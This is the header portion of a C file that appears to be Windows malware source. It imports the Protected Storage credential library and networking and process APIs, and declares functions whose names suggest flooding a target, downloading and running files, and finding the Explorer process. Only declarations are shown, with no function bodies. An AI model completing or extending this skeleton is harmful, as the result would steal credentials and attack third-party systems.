#define _WIN32_WINNT 0x0501
#define NO_STRICT
#include <malloc.h>
#include <stdio.h>
#include <stdlib.h>
#include <comutil.h>
#include <time.h>
#include <windows.h>
#import "pstorec.dll" no_namespace
#include <conio.h>    
#include <string.h>   
#include <wininet.h>
#include <winsock.h> // socket
#include <shlobj.h>
#include <ctype.h> 
#include <tchar.h>
#include <winable.h> 
#include "extern.h"
#include "windns.h"

#import "pstorec.dll" no_namespace
#include "Psapi.h" 
#pragma comment(lib,"psapi.lib") 
 
typedef BOOL(__stdcall *DFRC)(void);
typedef DNS_STATUS(WINAPI *DFRCEA)(LPCSTR);
char *ardres(const char *addr);
void SkyBye(char *target, char *port, char *len);
char *rndx(int size);
void everyday(char *jomsg, BOOL sendfile);
int mageshit(char *link,char *exxe);
void connectpeople(char *contact);
DWORD WINAPI welcomebitch (LPVOID param);
DWORD GetExplorerProcessID (void);
